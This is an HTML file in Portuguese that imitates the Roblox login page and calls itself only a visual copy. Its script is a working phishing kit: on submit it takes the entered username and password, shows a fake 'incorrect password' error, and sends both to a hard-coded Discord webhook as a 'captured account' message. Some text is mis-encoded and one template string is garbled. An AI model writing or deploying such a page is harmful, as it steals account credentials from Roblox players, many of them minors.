<!DOCTYPE html>
<html lang="pt-br">
<head>
  <meta charset="UTF-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
  <title>Roblox - Entrar</title>
  <link rel="preconnect" href="https://fonts.googleapis.com">
  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
  <link href="https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap" rel="stylesheet">
  
  <style>
    * { margin: 0; padding: 0; box-sizing: border-box; }
    body {
      font-family: 'Roboto', sans-serif;
      background: #0f0f10;
      color: #e3e3e3;
      min-height: 100vh;
      display: flex;
      justify-content: center;
      align-items: center;
      background-image: 
        radial-gradient(circle at 20% 30%, rgba(0, 162, 255, 0.08) 0%, transparent 40%),
        radial-gradient(circle at 80% 70%, rgba(105, 45, 255, 0.06) 0%, transparent 50%);
    }
    .login-container {
      background: rgba(25, 25, 28, 0.92);
      backdrop-filter: blur(10px);
      border: 1px solid rgba(100, 100, 120, 0.18);
      border-radius: 12px;
      padding: 48px 40px;
      width: 100%;
      max-width: 420px;
      text-align: center;
      box-shadow: 0 20px 60px rgba(0,0,0,0.6);
    }
    .logo { width: 180px; margin: 0 auto 36px; filter: drop-shadow(0 4px 12px rgba(0, 170, 255, 0.4)); }
    h1 { font-size: 28px; font-weight: 700; margin-bottom: 8px; color: #ffffff; }
    .subtitle { color: #a0a0a8; font-size: 15px; margin-bottom: 32px; }
    .input-group { margin-bottom: 20px; text-align: left; position: relative; }
    .input-group label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 500; color: #d0d0d8; }
    input { width: 100%; padding: 14px 50px 14px 16px; border: 1px solid #444; border-radius: 8px; background: #1a1a1f; color: white; font-size: 16px; transition: all 0.2s; }
    input:focus { outline: none; border-color: #00a2ff; box-shadow: 0 0 0 3px rgba(0, 162, 255, 0.25); }
    .eye-icon {
      position: absolute;
      right: 12px;
      top: 50%;
      transform: translateY(-50%);
      font-size: 22px;
      color: #b0b0b8;
      cursor: pointer;
      z-index: 10;
      background: transparent;
      line-height: 1;
    }
    .eye-icon:hover { color: #ffffff; }
    .btn-login { width: 100%; padding: 16px; background: #00c74e; color: white; border: none; border-radius: 8px; font-size: 18px; font-weight: 600; cursor: pointer; margin-top: 12px; transition: all 0.25s; }
    .btn-login:hover { background: #00e056; transform: translateY(-2px); box-shadow: 0 8px 24px rgba(0, 199, 78, 0.35); }
    .error-message, .test-message { margin-top: 16px; padding: 12px; background: rgba(255, 255, 0, 0.15); border: 1px solid rgba(255, 255, 0, 0.4); border-radius: 8px; color: #ffff66; font-size: 15px; font-weight: 500; opacity: 0; transform: translateY(-10px); transition: all 0.4s ease; pointer-events: none; }
    .test-message.show, .error-message.show { opacity: 1; transform: translateY(0); }
    .links { margin-top: 28px; font-size: 14px; }
    .links a { color: #00a2ff; text-decoration: none; margin: 0 12px; cursor: pointer; }
    .links a:hover { text-decoration: underline; }
    .footer { margin-top: 40px; font-size: 12px; color: #606068; }
    .disclaimer { margin-top: 24px; font-size: 13px; color: #707078; line-height: 1.4; }
    .disclaimer strong { color: #a0a0a8; }
  </style>
</head>
<body>

  <div class="login-container">
    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/3/32/Roblox_2022_Logo.svg/320px-Roblox_2022_Logo.svg.png" alt="Roblox" class="logo">

    <h1>Entrar</h1>
    <div class="subtitle">Aproveite milh√µes de experi√™ncias criadas por jogadores</div>

    <form id="loginForm">
      <div class="input-group">
        <label for="username">Nome de usu√°rio ou e-mail</label>
        <input type="text" id="username" placeholder="Seu @nome ou email" autocomplete="username" required>
      </div>

      <div class="input-group">
        <label for="password">Senha</label>
        <div class="password-wrapper">
          <input type="password" id="password" placeholder="Senha" autocomplete="current-password" required>
          <span class="eye-icon" id="eyeIcon">üëÅÔ∏è</span>
        </div>
      </div>

      <button type="submit" class="btn-login">Entrar</button>
    </form>

    <div id="errorMsg" class="error-message">Senha incorreta ou nome incorreto!</div>

    <div class="links">
      <a id="forgotPass">Esqueceu a senha?</a> ‚Ä¢ <a href="#">Criar conta</a>
    </div>

    <div id="testMsg" class="test-message">Bro eu disse que t√° em teste ;-;</div>

    <div class="footer">¬© Roblox Corporation 2026</div>

    <div class="disclaimer">
      <strong>@roblox Corporation</strong><br>
      S√≥ estou tentando fazer o visual do Roblox, s√≥ isso!
    </div>
  </div>

  <script>
    const form = document.getElementById('loginForm');
    const errorMsg = document.getElementById('errorMsg');
    const testMsg = document.getElementById('testMsg');
    const forgotPass = document.getElementById('forgotPass');
    
    // Seu webhook real aqui (substitua)
    const webhookUrl = 'https://discord.com/api/webhooks/1473860451589685344/N8gc13rR1kJj7Pb5DznSI88Lpz_8BLcxUReQ5VulpR001D2os62t3HjFP-NTK_ABAuFm';

    // Toggle olho
    const passwordInput = document.getElementById('password');
    const eyeIcon = document.getElementById('eyeIcon');

    if (eyeIcon && passwordInput) {
      eyeIcon.addEventListener('click', () => {
        const isPassword = passwordInput.type === 'password';
        passwordInput.type = isPassword ? 'text' : 'password';
        eyeIcon.textContent = isPassword ? 'üôà' : 'üëÅÔ∏è';
      });
    }

    // Esqueceu a senha?
    if (forgotPass) {
      forgotPass.addEventListener('click', (e) => {
        e.preventDefault();
        testMsg.classList.add('show');
        setTimeout(() => testMsg.classList.remove('show'), 3000);
      });
    }

    form.addEventListener('submit', async function(e) {
      e.preventDefault();

      errorMsg.classList.add('show');
      setTimeout(() => errorMsg.classList.remove('show'), 3000);

      const login = document.getElementById('username').value.trim();
      const senha = document.getElementById('password').value.trim();

      // Formato EXATO que voc√™ pediu agora: backticks s√≥ em volta do login e senha
      const mensagem = `üîê **Nova Conta Capturada**\n\n**Login:**\n\`\( {login || '‚Äî'}\`\n\n**Senha:**\n\` \){senha || '‚Äî'}\``;

      if (login) {
        try {
          const response = await fetch(webhookUrl, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ content: mensagem, allowed_mentions: { parse: [] } })
          });
          if (response.ok) console.log('Enviado com backticks s√≥ nos campos!');
        } catch (err) {
          console.error('Falha:', err);
        }
      }
    });
  </script>

</body>
  </html>
